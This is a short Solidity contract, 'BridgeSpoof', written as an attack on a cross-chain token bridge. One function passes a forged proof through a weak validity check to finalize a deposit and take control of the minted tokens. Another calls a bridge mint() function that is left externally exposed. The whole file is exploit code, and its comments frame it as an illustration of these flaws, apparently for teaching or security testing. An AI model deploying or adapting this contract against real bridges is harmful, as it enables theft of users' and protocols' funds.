
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBridge {
    function finalizeDeposit(bytes calldata proof) external returns (uint256);
    function mint(address to, uint256 amount) external;
    function isValidProof(bytes calldata proof) external view returns (bool);
}

contract BridgeSpoof {
    IBridge public bridge;

    constructor(address _bridge) {
        bridge = IBridge(_bridge);
    }

    // Crafts a 'proof' that passes a weak check (e.g., only a hash check)
    function attack(bytes calldata forgedProof) external {
        require(bridge.isValidProof(forgedProof), "proof rejected");
        uint256 minted = bridge.finalizeDeposit(forgedProof);
        // minted tokens are now under attacker control
    }

    // Some bridges expose mint() directly — should never be external
    function attackMint(address to, uint256 amount) external {
        bridge.mint(to, amount);
    }
}
